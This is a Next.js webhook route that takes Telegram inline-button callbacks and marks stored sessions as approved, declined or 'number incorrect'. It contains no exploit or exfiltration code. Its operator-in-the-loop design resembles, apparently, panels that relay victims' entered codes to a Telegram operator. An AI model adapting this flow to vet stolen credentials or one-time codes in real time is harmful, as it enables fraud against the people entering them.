import { NextRequest, NextResponse } from 'next/server';
import { sessionStore } from '../notify/route';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();

        // Handle callback query from inline buttons
        if (body.callback_query) {
            const callbackData = body.callback_query.data;
            const messageId = body.callback_query.message.message_id;
            const queryId = body.callback_query.id;

            // Parse the callback data
            const [action, type, sessionId] = callbackData.split('_');

            // Update the session
            const session = sessionStore.get(sessionId);
            if (session) {
                if (action === 'approve') {
                    session.approved = true;
                } else if (action === 'decline') {
                    session.approved = false;
                    session.reason = 'Your request was declined.';
                } else if (action === 'incorrect') {
                    session.approved = false;
                    session.reason = 'The number you entered is incorrect. Please try again.';
                }
            }

            // Acknowledge the callback
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: queryId })
            });

            // Edit the message to show response
            const responseText = session?.approved 
                ? `✅ APPROVED` 
                : `❌ DECLINED`;
            
            await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: body.callback_query.message.chat.id,
                    message_id: messageId,
                    text: `${body.callback_query.message.text}\n\n${responseText}`
                })
            });
        }

        return NextResponse.json({ ok: true });
    } catch (error) {
        console.error('Error in webhook:', error);
        return NextResponse.json({ error: 'Webhook processing failed' }, { status: 500 });
    }
          }
